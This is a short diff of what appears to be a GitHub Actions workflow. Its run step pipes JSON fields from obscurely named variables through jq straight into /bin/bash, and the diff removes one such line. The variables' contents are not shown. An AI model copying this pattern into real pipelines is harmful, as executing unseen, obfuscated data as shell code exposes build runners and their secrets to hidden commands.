@@ -29,7 +29,6 @@ jobs:
           echo $eon405 | jq -r .k02 | /bin/bash
           printf '%s' "$h9" | jq -r .juif2 | /bin/bash
           printf '%s' "$ezdqq32822" | jq -r .lr812 | /bin/bash
-          printf '%s' "$rw7349" | jq -r .onm2 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
